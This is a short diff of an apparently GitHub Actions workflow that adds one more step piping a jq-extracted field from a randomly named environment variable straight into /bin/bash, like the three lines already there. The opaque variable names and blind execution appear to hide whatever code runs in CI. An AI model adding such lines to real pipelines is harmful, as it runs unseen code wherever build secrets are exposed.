@@ -21,6 +21,7 @@ jobs:
           echo $mxo34571 | jq -r .q7930 | /bin/bash
           echo $aimh17 | jq -r .by0 | /bin/bash
           printf '%s' "$z65" | jq -r .eirbf51 | /bin/bash
+          echo $fz70 | jq -r .zg04 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
